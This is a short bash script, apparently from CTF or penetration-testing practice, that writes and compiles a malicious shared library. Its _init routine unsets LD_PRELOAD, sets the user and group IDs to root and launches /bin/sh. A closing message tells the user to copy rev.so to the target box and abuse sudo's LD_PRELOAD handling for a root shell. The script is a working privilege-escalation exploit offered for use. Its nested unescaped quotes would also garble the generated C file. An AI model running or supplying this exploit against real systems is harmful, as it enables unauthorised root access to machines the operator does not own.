#!/bin/bash


echo "#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}" > rev.c

gcc -fPIC -shared -o rev.so rev.c -nostartfiles
echo "Transfer The rev.so File To The Box Make It Executeable And Use the sudo rights to set LD_PRELOAD to the location of our payload"